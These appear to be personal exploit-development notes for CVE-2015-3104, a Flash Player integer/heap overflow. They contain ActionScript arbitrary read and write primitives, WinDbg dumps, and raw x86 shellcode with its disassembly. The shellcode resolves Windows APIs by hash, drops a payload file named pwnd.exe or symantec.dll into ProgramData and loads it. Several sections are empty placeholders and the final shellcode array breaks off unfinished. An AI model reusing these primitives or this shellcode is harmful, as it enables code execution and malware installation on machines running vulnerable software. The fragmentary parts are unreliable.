# [CVE-2015-3104 Adobe Flash Player - Integer Overflow](https://www.exploit-db.com/exploits/50290) 

### Overview:

This vulnerability is an interesting integer overflow which leads to a heap overflow. If we are able to control the location of the heap overflow, we

### Vulnerability 1: Information Leak

We are able to control the location of the heap overflow. Hence, after the heap overflow has occured, we can enumerate the location for the base address of the NPSWF32.dll and for vtables. We do this by allocating strings of "X00U00..". We then free half of the allocations to create holes of 0x18 bytes. When the ShaderJob starts shading, it will look for one of these allocations to copy over the metadata of the shader into one of these "hole"s. Because there is an integer/heap overflow, we will over copy some of the data beyond the shader information. We can iterate through our allocations of "X00U00.."s in order to find an allocation which does not equal to 0x10 to find the corrupted index.

### Vulnerability 2: Arbitrary Read 

Given:

```
baIn.writeUnsignedInt(0x41414141);
baIn.writeUnsignedInt(0x42424242);
baIn.writeUnsignedInt(0x43434343); 
baIn.writeUnsignedInt(0x44444444); 
baIn.writeUnsignedInt(0x45454545); <- corrupted_ba_address points to this value (0x16000000 + 0xXXXXXXXX)
baIn.writeUnsignedInt(0x46464646); 
baIn.writeUnsignedInt(0x47474747); <- read starts from here
baIn.writeUnsignedInt(0x48484848); 
baIn.writeUnsignedInt(0x49494949); 
```

Running `allocated[corrupted].length` returns 0x49494949 and running allocated[corrupted].readUnsignedInt() attempts to read and return what 0x47474747 is pointing to (related code: `NPSWF32_17_0_0_188!BrokerMainW+0x953e0`). In this case, 0x47474747 is invalid memory and will hence throw an error. If we set 0x47474747 to 0x16000000, we can start reading what is at 0x16000000 which would be our allocation of "X00U00.."s. If the location of corruption is after 0x16000000, then we can continue reading the byte array from 0x16000000 till we actually find the location of our corrupted bytes. After which, we can dump the actual location of the corrupted bytes and observe that we can find references to NPSWF32.dll and vtables. We can convert this into a arbitrary read function:

```
private function readDword(pAddress:uint):uint
{
    // Read a DWORD from an address
    // by changing the ptr to array of bytes
    var tmpIndex:uint = 0;
    var res:uint = 0;

    // Change ptr to array of bytes
    tmpIndex = (corrupted_ba_address + 0x8) - 0x16000000;
    allocate[corrupted].position = tmpIndex;
    allocate[corrupted].writeUnsignedInt(pAddress);
    allocate[corrupted].position = 0;
    // Read a DWORD from the new address
    res = allocate[corrupted].readUnsignedInt();
    // Reset ptr to array of bytes to 0x16000000
    tmpIndex = (corrupted_ba_address + 0x8) - pAddress;
    allocate[corrupted].position = tmpIndex;
    allocate[corrupted].writeUnsignedInt(0x16000000);
    return res;
}
```

Where `corrupted_ba_address` is the location of our corrupted addresses points to the location at 0x45454545, we first find the corrupted index and store it into tmpIndex. From our byte array stream, we set the position to our corrupted index which points to 0x47474747, before overwriting 0x47474747 with anything we want.

We then set the position back to 0 and read what 0x47474747 is pointing to (which is the starting point of our read from the corrupted index allocate[corrupted].readUnsignedInt() at position 0), and then read what 0x47474747 is pointing to, which has since been updated by the value that we want to read

We basically overwrite the value of 0x47474747 to the pointer which points the address that we want to read (pAddress) stored at `allocate[corrupted].position = tmpIndex`, before setting `allocate[corrupted].position = 0` and calling readUnsignedInt(), before restoring it 0x47474747 back to 0x47474747

### Vulnerability 3: Arbitrary Write

```
private function writeDword(pAddress:uint, value:uint):void
{
    // write a DWORD to an address
    // by changing the ptr to array of bytes
    var tmpIndex:uint = 0;
    // Change ptr to array of bytes
    tmpIndex = (corrupted_ba_address + 0x8) - 0x16000000;
    allocate[corrupted].position = tmpIndex;
    allocate[corrupted].writeUnsignedInt(pAddress);
    allocate[corrupted].position = 0;
    // Read a DWORD from the new address
    allocate[corrupted].writeUnsignedInt(value);
    // Reset ptr to array of bytes to 0x16000000
    tmpIndex = (corrupted_ba_address + 0x8) - pAddress;
    allocate[corrupted].position = tmpIndex;
    allocate[corrupted].writeUnsignedInt(0x16000000);
}
```

Basically same as Arbitrary Read, just that instead of reading from position 0, we will write at position 0. Meaning, we would write at what 0x47474747 is pointing to, which at this point it should be replaced with the value of pAddress.

```
private function writeBytes(pAddress:uint, data:ByteArray):void
{
    // write a ByteArray to an address
    // by changing the ptr to array of bytes
    var tmpIndex:uint = 0;
    // Change ptr to array of bytes
    tmpIndex = (corrupted_ba_address + 0x8) - 0x16000000;
    allocate[corrupted].position = tmpIndex;
    allocate[corrupted].writeUnsignedInt(pAddress);
    allocate[corrupted].position = 0;
    // Read a ByteArray tp the new address
    allocate[corrupted].writeBytes(data, 0, 0);
    // Reset ptr to array of bytes to 0x16000000
    tmpIndex = (corrupted_ba_address + 0x8) - pAddress;
    allocate[corrupted].position = tmpIndex;
    allocate[corrupted].writeUnsignedInt(0x16000000);
}
```

We can also write bytes instead of 4-byte DWORDs

### Exploitation 1: Leaking NPSWF32

### Exploitation 2: Leaking Vtable

### Exploitation 3: Calling Vtable Methods

### Exploitation 4: Remote Code Execution

### Exploitation 5: Sandbox Escape

base64 decoder shit not working at all sadge

### References:

- [Intro to Integer Overflows #1](https://www.youtube.com/watch?v=m4DFYgtqNY8)

- [Intro to Integer Overflows #2](https://www.exploit-db.com/docs/english/28477-linux-integer-overflow-and-underflow.pdf)

- [Initial PoC](https://bugs.chromium.org/p/project-zero/issues/detail?id=323&can=1&q=Shader)

- [Full Exploit Chain](https://www.exploit-db.com/exploits/50290)

- [Flash Player Debugger](https://www.offsec.com/vulndev/fldbg-a-pykd-script-to-debug-flashplayer/)

- [Adobe Flash Player Sandbox Escape - RELATED](https://www.exploit-db.com/search?q=+Flash+Broker-Based+-+Sandbox+Escape)

- [Adobe Flash Player SandBox Escape - UNRELATED](https://www.youtube.com/watch?v=Mlc7pGy02YU)

- [Nice gist to find related content](https://gist.github.com/SkyBulk/7c45552b15b77a985e1e03f6584b679d)

- [Nice article to find related content](https://www.cyberpunk.rs/best-cybersecurity-courses)

- Other Integer/Heap Overflow Vulnerabilities discovered in Adobe Flash Player

    1. [CVE-2012-1535](https://contagiodump.blogspot.com/2012/10/cve-2012-1535-adobe-flash-player.html)
    
    2. [CVE-2014-0556](https://global.ahnlab.com/global/upload/download/documents/1506262920801954.pdf)

- [Windows 10 32bit ISO](https://www.softlay.com/downloads/windows-10-1607?download=links)

- [Firefox download](https://ftp.mozilla.org/pub/firefox/releases/50.0/win32/en-US/)

- [Adobe Flex SDK](https://archive.org/details/flex_sdks)

- [Compiling .as to .swf](https://stackoverflow.com/questions/30690509/compile-actionscript-to-a-swf)

- [DbhFlashVul](https://github.com/blaquee/DbgFlashVul)

First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\Windows\system32\Macromed\Flash\NPSWF32_16_0_0_296.dll - 
eax=41414141 ebx=76f97400 ecx=00004142 edx=00000000 esi=02c2a000 edi=5521bb0c
eip=5489dbde esp=0133e764 ebp=5521bb2c iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00210206
NPSWF32_16_0_0_296!IAEModule_IAEKernel_UnloadModule+0x69bae:
5489dbde 8b18            mov     ebx,dword ptr [eax]  ds:0023:41414141=????????

https://stackoverflow.com/questions/21269690/where-can-i-download-old-versions-of-the-adobe-flex-sdk

Call [Function$/createEmptyFunction]
Call [Object$/_dontEnumPrototype]
Call [Object$/_init]
Call [flash.geom::Rectangle]
Call [flash.display::Stage]
Call [flash.display::DisplayObjectContainer]
Call [flash.display::InteractiveObjectVector.<flash.display::Stage3D>]
Call [flash.display::DisplayObject]
Call [flash.events::EventDispatcher]
Call [Exploit]
Call [flash.display::Sprite]
Call [flash.utils::ByteArray]
Call [flash.display::ShaderJobs]
Call [flash.display::Shader]
Call [flash.display::Shader/set byteCode]
Call [flash.display::ShaderData]
Call [flash.display::ShaderInput]
Call [ArgumentError]
Call [Error]
Call []
Call [flash.display::LoaderInfo]

Call [Function$/createEmptyFunction]
Call [Object$/_dontEnumPrototype]
Call [Object$/_init]
Call [flash.geom::Rectangle]
Call [flash.display::Stage]
Call [flash.display::DisplayObjectContainer]
Call [flash.display::InteractiveObjectVector.<flash.display::Stage3D>]
Call [flash.display::DisplayObject]
Call [flash.events::EventDispatcher]
Call [Exploit]
Call [flash.display::Sprite]
Call [flash.utils::ByteArray]
Call [flash.display::ShaderJobs]
Call [flash.display::Shader]
Call [flash.display::Shader/set byteCode]
Call [flash.display::ShaderData]
Call [flash.display::ShaderInput]
Call [flash.display::LoaderInfo]


Call [Function$/createEmptyFunction]
Call [Object$/_dontEnumPrototype]
Call [Object$/_init]
Call [flash.geom::Rectangle]
Call [flash.display::Stage]
Call [flash.display::DisplayObjectContainer]
Call [flash.display::InteractiveObjectVector.<flash.display::Stage3D>]
Call [flash.display::DisplayObject]
Call [flash.events::EventDispatcher]
Call [Exploit]
Call [flash.display::Sprite]
Call [flash.utils::ByteArray]
Call [flash.display::ShaderJobs] var job:ShaderJob = new ShaderJob();
Call [flash.display::Shader] var shader:Shader = new Shader();
Call [flash.display::Shader/set byteCode] shader.byteCode = ba;


0:000> dd 03c8900b  - c
03c88fff  0402a100 41ff0100 4000a300 42424242
03c8900f  00000000 00000000 00000000 00000000
0:000> db 03c8900b  - c + 8 + 3
03c8900a  40 42 42 42 42 00 00 00-00 00 00 00 00 00 00 00  @BBBB...........

03aa900a  
03aa7160 
0:000> ? 03aa900a  -esi
Evaluate expression: 7850 = 00001eaa



Call [flash.display::ShaderData]
Call [flash.display::ShaderInput]
Call [flash.errors::EOFError]
Call [flash.errors::IOError]
Call [Error]
Call []
Call [flash.display::LoaderInfo]
(fdc.1fd4): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=41414141 ebx=75647480 ecx=0000008e edx=00000000 esi=0b682000 edi=53cfbb78
eip=5337dbde esp=00cfeb1c ebp=53cfbb98 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00210206
NPSWF32_16_0_0_296!IAEModule_IAEKernel_UnloadModule+0x69bae:
5337dbde 8b18            mov     ebx,dword ptr [eax]  ds:0023:41414141=????????
0:000> k
ChildEBP RetAddr  
WARNING: Stack unwind information not available. Following frames may be wrong.
00cfeb2c 5337d624 NPSWF32_16_0_0_296!IAEModule_IAEKernel_UnloadModule+0x69bae
00cfeb34 52e40c42 NPSWF32_16_0_0_296!IAEModule_IAEKernel_UnloadModule+0x695f4
00cfeb4c 52e94607 NPSWF32_16_0_0_296!FlashPlayer_16_0_0_296_FlashPlayer+0x63984
00000000 00000000 NPSWF32_16_0_0_296!FlashPlayer_16_0_0_296_FlashPlayer+0xb7349

Call [JSON$/stringify]

bc *; !SetBaseAddress 516f0000    ;!SetBpForJitCode JSON$/stringify



s -a 0 L?80000000 LOG":"Allocated



0:000> k
ChildEBP RetAddr  
WARNING: Frame IP not in any known module. Following frames may be wrong.
00f1ecf0 543e321a 0x3b30cb6
00f1ed50 543e321a NPSWF32_16_0_0_296!IAEModule_IAEKernel_UnloadModule+0x12f1ea
00f1ed54 03ba59d0 NPSWF32_16_0_0_296!IAEModule_IAEKernel_UnloadModule+0x12f1ea
00f1ed58 00000000 0x3ba59d0

0:000> k
ChildEBP RetAddr  
WARNING: Stack unwind information not available. Following frames may be wrong.
0073ec78 543d2c01 NPSWF32_16_0_0_296!IAEModule_IAEKernel_UnloadModule+0x11ce77
0073eccc 543ddffc NPSWF32_16_0_0_296!IAEModule_IAEKernel_UnloadModule+0x11ebd1
00000000 00000000 NPSWF32_16_0_0_296!IAEModule_IAEKernel_UnloadModule+0x129fcc

NPSWF32_16_0_0_296!IAEModule_IAEKernel_UnloadModule+0x11ce77

03bf5000  57 30 30 54 30 30 30 30-30 30 30 30 30 30 30 30  W00T000000000000
03bf6000  57 30 30 54 30 30 30 30-30 30 30 30 30 30 30 30  W00T000000000000
03bf7000  57 30 30 54 30 30 30 30-30 30 30 30 30 30 30 30  W00T000000000000
03bf8000  57 30 30 54 30 30 30 30-30 30 30 30 30 30 30 30  W00T000000000000
03bf9000  57 30 30 54 30 30 30 30-30 30 30 30 30 30 30 30  W00T000000000000
03c9b000  57 30 30 54 30 30 30 30-30 30 30 30 30 30 30 30  W00T000000000000
03c9c000  57 30 30 54 30 30 30 30-30 30 30 30 30 30 30 30  W00T000000000000
03c9d000  57 30 30 54 30 30 30 30-30 30 30 30 30 30 30 30  W00T000000000000
03c9e000  57 30 30 54 30 30 30 30-30 30 30 30 30 30 30 30  W00T000000000000
03ca0000  57 30 30 54 30 30 30 30-30 30 30 30 30 30 30 30  W00T000000000000


https://www.filehorse.com/download-java-runtime-32/

https://www.majorgeeks.com/files/details/java_runtime_environment_(jre)_32_bit.html

https://www.geeksforgeeks.org/how-to-set-java-path-in-windows-and-linux/


0:000> k
ChildEBP RetAddr  
WARNING: Stack unwind information not available. Following frames may be wrong.
00f1ea28 543d2c01 NPSWF32_16_0_0_296!IAEModule_IAEKernel_UnloadModule+0x11ce77
00f1ea7c 543ddffc NPSWF32_16_0_0_296!IAEModule_IAEKernel_UnloadModule+0x11ebd1
00000000 00000000 NPSWF32_16_0_0_296!IAEModule_IAEKernel_UnloadModule+0x129fcc





0:000> u eip-10
NPSWF32_16_0_0_296!BrokerMainW+0x90741:
10284b4e 2e713c          hnt jno NPSWF32_16_0_0_296!BrokerMainW+0x90780 (10284b8d)
10284b51 008b75fc3bf7    add     byte ptr [ebx-8C4038Bh],cl
10284b57 7414            je      NPSWF32_16_0_0_296!BrokerMainW+0x90760 (10284b6d)
10284b59 8b06            mov     eax,dword ptr [esi]
10284b5b 57              push    edi
10284b5c 8bce            mov     ecx,esi
10284b5e ff10            call    dword ptr [eax]

89E581EC0002000031C9648B71308B760C8B761C8B5E088B7E208B3666394F1875F2EB555E83EE54EB54608B433C8B7C037801DF8B4F188B472001D88945FCE336498B45FC8B
348801DE31C099FCAC84C07407C1CA0D01C2EBF43B54242475DF8B572401DA668B0C4A
8B571C01DA8B048A01D88944241C61C3E8A6FFFFFF688E4E0EECFFD689451068A51700
7CFFD6894514681F790AE8FFD689451868FB97FD0FFFD689451C6A00682E6578656870
776E6468796E635C6869636553685C44657668736F6674686963726F6874615C4D6861
6D446168726F677268433A5C5054596A016A006A0C54586A0068800000006A02506A03
680000004051FF55148945246A00680804001A684A200100680000101A50FF5518FF75
24FF551C6A00682E646C6C686E7465636873796D6168796E635C6869636553685C4465
7668736F6674686963726F6874615C4D68616D446168726F677268433A5C505459894286A016A006A0C54586A0068800000006A02506A03680000004051FF55148945246A00680804001A6800260000680000201A50FF5518FF7524FF551CFF7528FF5510

{ 0x89, 0xE5, 0x81, 0xEC, 0x00, 0x02, 0x00, 0x00, 0x31, 0xC9, 0x64, 0x8B, 0x71, 0x30, 0x8B, 0x76, 0x0C, 0x8B, 0x76, 0x1C, 0x8B, 0x5E, 0x08, 0x8B, 0x7E, 0x20, 0x8B, 0x36, 0x66, 0x39, 0x4F, 0x18, 0x75, 0xF2, 0xEB, 0x55, 0x5E, 0x83, 0xEE, 0x54, 0xEB, 0x54, 0x60, 0x8B, 0x43, 0x3C, 0x8B, 0x7C, 0x03, 0x78, 0x01, 0xDF, 0x8B, 0x4F, 0x18, 0x8B, 0x47, 0x20, 0x01, 0xD8, 0x89, 0x45, 0xFC, 0xE3, 0x36, 0x49, 0x8B, 0x45, 0xFC, 0x8B, 0x34, 0x88, 0x01, 0xDE, 0x31, 0xC0, 0x99, 0xFC, 0xAC, 0x84, 0xC0, 0x74, 0x07, 0xC1, 0xCA, 0x0D, 0x01, 0xC2, 0xEB, 0xF4, 0x3B, 0x54, 0x24, 0x24, 0x75, 0xDF, 0x8B, 0x57, 0x24, 0x01, 0xDA, 0x66, 0x8B, 0x0C, 0x4A, 0x8B, 0x57, 0x1C, 0x01, 0xDA, 0x8B, 0x04, 0x8A, 0x01, 0xD8, 0x89, 0x44, 0x24, 0x1C, 0x61, 0xC3, 0xE8, 0xA6, 0xFF, 0xFF, 0xFF, 0x68, 0x8E, 0x4E, 0x0E, 0xEC, 0xFF, 0xD6, 0x89, 0x45, 0x10, 0x68, 0xA5, 0x17, 0x00, 0x7C, 0xFF, 0xD6, 0x89, 0x45, 0x14, 0x68, 0x1F, 0x79, 0x0A, 0xE8, 0xFF, 0xD6, 0x89, 0x45, 0x18, 0x68, 0xFB, 0x97, 0xFD, 0x0F, 0xFF, 0xD6, 0x89, 0x45, 0x1C, 0x6A, 0x00, 0x68, 0x2E, 0x65, 0x78, 0x65, 0x68, 0x70, 0x77, 0x6E, 0x64, 0x68, 0x79, 0x6E, 0x63, 0x5C, 0x68, 0x69, 0x63, 0x65, 0x53, 0x68, 0x5C, 0x44, 0x65, 0x76, 0x68, 0x73, 0x6F, 0x66, 0x74, 0x68, 0x69, 0x63, 0x72, 0x6F, 0x68, 0x74, 0x61, 0x5C, 0x4D, 0x68, 0x61, 0x6D, 0x44, 0x61, 0x68, 0x72, 0x6F, 0x67, 0x72, 0x68, 0x43, 0x3A, 0x5C, 0x50, 0x54, 0x59, 0x6A, 0x01, 0x6A, 0x00, 0x6A, 0x0C, 0x54, 0x58, 0x6A, 0x00, 0x68, 0x80, 0x00, 0x00, 0x00, 0x6A, 0x02, 0x50, 0x6A, 0x03, 0x68, 0x00, 0x00, 0x00, 0x40, 0x51, 0xFF, 0x55, 0x14, 0x89, 0x45, 0x24, 0x6A, 0x00, 0x68, 0x08, 0x04, 0x00, 0x1A, 0x68, 0x4A, 0x20, 0x01, 0x00, 0x68, 0x00, 0x00, 0x10, 0x1A, 0x50, 0xFF, 0x55, 0x18, 0xFF, 0x75, 0x24, 0xFF, 0x55, 0x1C, 0x6A, 0x00, 0x68, 0x2E, 0x64, 0x6C, 0x6C, 0x68, 0x6E, 0x74, 0x65, 0x63, 0x68, 0x73, 0x79, 0x6D, 0x61, 0x68, 0x79, 0x6E, 0x63, 0x5C, 0x68, 0x69, 0x63, 0x65, 0x53, 0x68, 0x5C, 0x44, 0x65, 0x76, 0x68, 0x73, 0x6F, 0x66, 0x74, 0x68, 0x69, 0x63, 0x72, 0x6F, 0x68, 0x74, 0x61, 0x5C, 0x4D, 0x68, 0x61, 0x6D, 0x44, 0x61, 0x68, 0x72, 0x6F, 0x67, 0x72, 0x68, 0x43, 0x3A, 0x5C, 0x50, 0x54, 0x59, 0x89, 0x4D, 0x28, 0x6A, 0x01, 0x6A, 0x00, 0x6A, 0x0C, 0x54, 0x58, 0x6A, 0x00, 0x68, 0x80, 0x00, 0x00, 0x00, 0x6A, 0x02, 0x50, 0x6A, 0x03, 0x68, 0x00, 0x00, 0x00, 0x40, 0x51, 0xFF, 0x55, 0x14, 0x89, 0x45, 0x24, 0x6A, 0x00, 0x68, 0x08, 0x04, 0x00, 0x1A, 0x68, 0x00, 0x26, 0x00, 0x00, 0x68, 0x00, 0x00, 0x20, 0x1A, 0x50, 0xFF, 0x55, 0x18, 0xFF, 0x75, 0x24, 0xFF, 0x55, 0x1C, 0xFF, 0x75, 0x28, 0xFF, 0x55, 0x10 }

https://github.com/ihack4falafel/ROR13HashGenerator/blob/master/pre_computed_hashes/kernel32.md

Disassembly:
0:  89 e5                   mov    ebp,esp
2:  81 ec 00 02 00 00       sub    esp,0x200
8:  31 c9                   xor    ecx,ecx
a:  64 8b 71 30             mov    esi,DWORD PTR fs:[ecx+0x30]
e:  8b 76 0c                mov    esi,DWORD PTR [esi+0xc]
11: 8b 76 1c                mov    esi,DWORD PTR [esi+0x1c]
14: 8b 5e 08                mov    ebx,DWORD PTR [esi+0x8]
17: 8b 7e 20                mov    edi,DWORD PTR [esi+0x20]
1a: 8b 36                   mov    esi,DWORD PTR [esi]
1c: 66 39 4f 18             cmp    WORD PTR [edi+0x18],cx
20: 75 f2                   jne    0x14
22: eb 55                   jmp    0x79
24: 5e                      pop    esi
25: 83 ee 54                sub    esi,0x54
28: eb 54                   jmp    0x7e
2a: 60                      pusha
2b: 8b 43 3c                mov    eax,DWORD PTR [ebx+0x3c]
2e: 8b 7c 03 78             mov    edi,DWORD PTR [ebx+eax*1+0x78]
32: 01 df                   add    edi,ebx
34: 8b 4f 18                mov    ecx,DWORD PTR [edi+0x18]
37: 8b 47 20                mov    eax,DWORD PTR [edi+0x20]
3a: 01 d8                   add    eax,ebx
3c: 89 45 fc                mov    DWORD PTR [ebp-0x4],eax
3f: e3 36                   jecxz  0x77
41: 49                      dec    ecx
42: 8b 45 fc                mov    eax,DWORD PTR [ebp-0x4]
45: 8b 34 88                mov    esi,DWORD PTR [eax+ecx*4]
48: 01 de                   add    esi,ebx
4a: 31 c0                   xor    eax,eax
4c: 99                      cdq
4d: fc                      cld
4e: ac                      lods   al,BYTE PTR ds:[esi]
4f: 84 c0                   test   al,al
51: 74 07                   je     0x5a
53: c1 ca 0d                ror    edx,0xd
56: 01 c2                   add    edx,eax
58: eb f4                   jmp    0x4e
5a: 3b 54 24 24             cmp    edx,DWORD PTR [esp+0x24]
5e: 75 df                   jne    0x3f
60: 8b 57 24                mov    edx,DWORD PTR [edi+0x24]
63: 01 da                   add    edx,ebx
65: 66 8b 0c 4a             mov    cx,WORD PTR [edx+ecx*2]
69: 8b 57 1c                mov    edx,DWORD PTR [edi+0x1c]
6c: 01 da                   add    edx,ebx
6e: 8b 04 8a                mov    eax,DWORD PTR [edx+ecx*4]
71: 01 d8                   add    eax,ebx
73: 89 44 24 1c             mov    DWORD PTR [esp+0x1c],eax
77: 61                      popa
78: c3                      ret
79: e8 a6 ff ff ff          call   0x24
=========== IMPORTANT ========================= 82bytes

7e: 68 8e 4e 0e ec          push   0xec0e4e8e
83: ff d6                   call   esi
85: 89 45 10                mov    DWORD PTR [ebp+0x10],eax
88: 68 a5 17 00 7c          push   0x7c0017a5
8d: ff d6                   call   esi
8f: 89 45 14                mov    DWORD PTR [ebp+0x14],eax
92: 68 1f 79 0a e8          push   0xe80a791f
97: ff d6                   call   esi
99: 89 45 18                mov    DWORD PTR [ebp+0x18],eax
9c: 68 fb 97 fd 0f          push   0xffd97fb
a1: ff d6                   call   esi
a3: 89 45 1c                mov    DWORD PTR [ebp+0x1c],eax
=========== IMPORTANT ========================= 
a6: 6a 00                   push   0x0
a8: 68 2e 65 78 65          push   0x6578652e
ad: 68 70 77 6e 64          push   0x646e7770 // pwnd.exe
b2: 68 79 6e 63 5c          push   0x5c636e79
b7: 68 69 63 65 53          push   0x53656369
bc: 68 5c 44 65 76          push   0x7665445c
c1: 68 73 6f 66 74          push   0x74666f73
c6: 68 69 63 72 6f          push   0x6f726369
cb: 68 74 61 5c 4d          push   0x4d5c6174
d0: 68 61 6d 44 61          push   0x61446d61
d5: 68 72 6f 67 72          push   0x72676f72
da: 68 43 3a 5c 50          push   0x505c3a43 // C:\SrograDma
df: 54                      push   esp
e0: 59                      pop    ecx
e1: 6a 01                   push   0x1
e3: 6a 00                   push   0x0
e5: 6a 0c                   push   0xc
e7: 54                      push   esp
e8: 58                      pop    eax
e9: 6a 00                   push   0x0
eb: 68 80 00 00 00          push   0x80
f0: 6a 02                   push   0x2
f2: 50                      push   eax
f3: 6a 03                   push   0x3
f5: 68 00 00 00 40          push   0x40000000
fa: 51                      push   ecx
fb: ff 55 14                call   DWORD PTR [ebp+0x14] //////////createfile pwnd.exe
fe: 89 45 24                mov    DWORD PTR [ebp+0x24],eax
101:    6a 00                   push   0x0
103:    68 08 04 00 1a          push   0x1a000408
108:    68 4a 20 01 00          push   0x1204a    //// number of bytes to write
10d:    68 00 00 10 1a          push   0x1a100000 ////lpBuffer
112:    50                      push   eax
113:    ff 55 18                call   DWORD PTR [ebp+0x18]
116:    ff 75 24                push   DWORD PTR [ebp+0x24]
119:    ff 55 1c                call   DWORD PTR [ebp+0x1c]
11c:    6a 00                   push   0x0
11e:    68 2e 64 6c 6c          push   0x6c6c642e
123:    68 6e 74 65 63          push   0x6365746e //  push   0x646e7770 68 70 77 6e 64 
128:    68 73 79 6d 61          push   0x616d7973 // push   0x646e7770 remove
12d:    68 79 6e 63 5c          push   0x5c636e79 C:\ProgramData\Microsoft\DeviceSync\
132:    68 69 63 65 53          push   0x53656369
137:    68 5c 44 65 76          push   0x7665445c
13c:    68 73 6f 66 74          push   0x74666f73
141:    68 69 63 72 6f          push   0x6f726369
146:    68 74 61 5c 4d          push   0x4d5c6174
14b:    68 61 6d 44 61          push   0x61446d61
150:    68 72 6f 67 72          push   0x72676f72
155:    68 43 3a 5c 50          push   0x505c3a43
15a:    54                      push   esp
15b:    59                      pop    ecx
15c:    89 4d 28                mov    DWORD PTR [ebp+0x28],ecx
15f:    6a 01                   push   0x1
161:    6a 00                   push   0x0
163:    6a 0c                   push   0xc
165:    54                      push   esp
166:    58                      pop    eax
167:    6a 00                   push   0x0
169:    68 80 00 00 00          push   0x80
16e:    6a 02                   push   0x2
170:    50                      push   eax
171:    6a 03                   push   0x3
173:    68 00 00 00 40          push   0x40000000
178:    51                      push   ecx
179:    ff 55 14                call   DWORD PTR [ebp+0x14]
17c:    89 45 24                mov    DWORD PTR [ebp+0x24],eax
17f:    6a 00                   push   0x0
181:    68 08 04 00 1a          push   0x1a000408
186:    68 00 26 00 00          push   0x2600 // push   0x1ae00 68 00 ae 01 00
18b:    68 00 00 20 1a          push   0x1a200000
190:    50                      push   eax
191:    ff 55 18                call   DWORD PTR [ebp+0x18]
194:    ff 75 24                push   DWORD PTR [ebp+0x24]
197:    ff 55 1c                call   DWORD PTR [ebp+0x1c]
19a:    ff 75 28                push   DWORD PTR [ebp+0x28]
19d:    ff 55 10                call   DWORD PTR [ebp+0x10]

// C:\ProgramData\Microsoft\DeviceSync\symantec.dll
// C:\ProgramData\Microsoft\DeviceSync\pwwned


{ 0x89, 0xE5, 0x81, 0xEC, 0x00, 0x02, 0x00, 0x00, 0x31, 0xC9, 0x64, 0x8B, 0x71, 0x30, 0x8B, 0x76, 0x0C, 0x8B, 0x76, 0x1C, 0x8B, 0x5E, 0x08, 0x8B, 0x7E, 0x20, 0x8B, 0x36, 0x66, 0x39, 0x4F, 0x18, 0x75, 0xF2, 0xEB, 0x55, 0x5E, 0x83, 0xEE, 0x54, 0xEB, 0x54, 0x60, 0x8B, 0x43, 0x3C, 0x8B, 0x7C, 0x03, 0x78, 0x01, 0xDF, 0x8B, 0x4F, 0x18, 0x8B, 0x47, 0x20, 0x01, 0xD8, 0x89, 0x45, 0xFC, 0xE3, 0x36, 0x49, 0x8B, 0x45, 0xFC, 0x8B, 0x34, 0x88, 0x01, 0xDE, 0x31, 0xC0, 0x99, 0xFC, 0xAC, 0x84, 0xC0, 0x74, 0x07, 0xC1, 0xCA, 0x0D, 0x01, 0xC2, 0xEB, 0xF4, 0x3B, 0x54, 0x24, 0x24, 0x75, 0xDF, 0x8B, 0x57, 0x24, 0x01, 0xDA, 0x66, 0x8B, 0x0C, 0x4A, 0x8B, 0x57, 0x1C, 0x01, 0xDA, 0x8B, 0x04, 0x8A, 0x01, 0xD8, 0x89, 0x44, 0x24, 0x1C, 0x61, 0xC3, 0xE8, 0xA6, 0xFF, 0xFF, 0xFF, 0x68, 0x8E, 0x4E, 0x0E, 0xEC, 0xFF, 0xD6, 0x89, 0x45, 0x10, 0x68, 0xA5, 0x17, 0x00, 0x7C, 0xFF, 0xD6, 0x89, 0x45, 0x14, 0x68, 0x1F, 0x79, 0x0A, 0xE8, 0xFF, 0xD6, 0x89, 0x45, 0x18, 0x68, 0xFB, 0x97, 0xFD, 0x0F, 0xFF, 0xD6, 0x89, 0x45, 0x1C, 0x6A, 0x00, 0x68, 0x2E, 0x65, 0x78, 0x65, 0x68, 0x70, 0x77, 0x6E, 0x64, 0x68, 0x79, 0x6E, 0x63, 0x5C, 0x68, 0x69, 0x63, 0x65, 0x53, 0x68, 0x5C, 0x44, 0x65, 0x76, 0x68, 0x73, 0x6F, 0x66, 0x74, 0x68, 0x69, 0x63, 0x72, 0x6F, 0x68, 0x74, 0x61, 0x5C, 0x4D, 0x68, 0x61, 0x6D, 0x44, 0x61, 0x68, 0x72, 0x6F, 0x67, 0x72, 0x68, 0x43, 0x3A, 0x5C, 0x50, 0x54, 0x59, 0x6A, 0x01, 0x6A, 0x00, 0x6A, 0x0C, 0x54, 0x58, 0x6A, 0x00, 0x68, 0x80, 0x00, 0x00, 0x00, 0x6A, 0x02, 0x50, 0x6A, 0x03, 0x68, 0x00, 0x00, 0x00, 0x40, 0x51, 0xFF, 0x55, 0x14, 0x89, 0x45, 0x24, 0x6A, 0x00, 0x68, 0x08, 0x04, 0x00, 0x1A, 0x68, 0x4A, 0x20, 0x01, 0x00, 0x68, 0x00, 0x00, 0x10, 0x1A, 0x50, 0xFF, 0x55, 0x18, 0xFF, 0x75, 0x24, 0xFF, 0x55, 0x1C, 0x6A, 0x00, 0x68, 0x2E, 0x64, 0x6C, 0x6C, 0x68, 0x70, 0x77, 0x6e, 0x64, 0x68, 0x79, 0x6E, 0x63, 0x5C, 0x68, 0x69, 0x63, 0x65, 0x53, 0x68, 0x5C, 0x44, 0x65, 0x76, 0x68, 0x73, 0x6F, 0x66, 0x74, 0x68, 0x69, 0x63, 0x72, 0x6F, 0x68, 0x74, 0x61, 0x5C, 0x4D, 0x68, 0x61, 0x6D, 0x44, 0x61, 0x68, 0x72, 0x6F, 0x67, 0x72, 0x68, 0x43, 0x3A, 0x5C, 0x50, 0x54, 0x59, 0x89, 0x4D, 0x28, 0x6A, 0x01, 0x6A, 0x00, 0x6A, 0x0C, 0x54, 0x58, 0x6A, 0x00, 0x68, 0x80, 0x00, 0x00, 0x00, 0x6A, 0x02, 0x50, 0x6A, 0x03, 0x68, 0x00, 0x00, 0x00, 0x40, 0x51, 0xFF, 0x55, 0x14, 0x89, 0x45, 0x24, 0x6A, 0x00, 0x68, 0x08, 0x04, 0x00, 0x1A, 0x68, 0x00, 0xae, 0x01, 0x00, 0x68, 0x00, 0x00, 0x20, 0x1A, 0x50, 0xFF, 0x55, 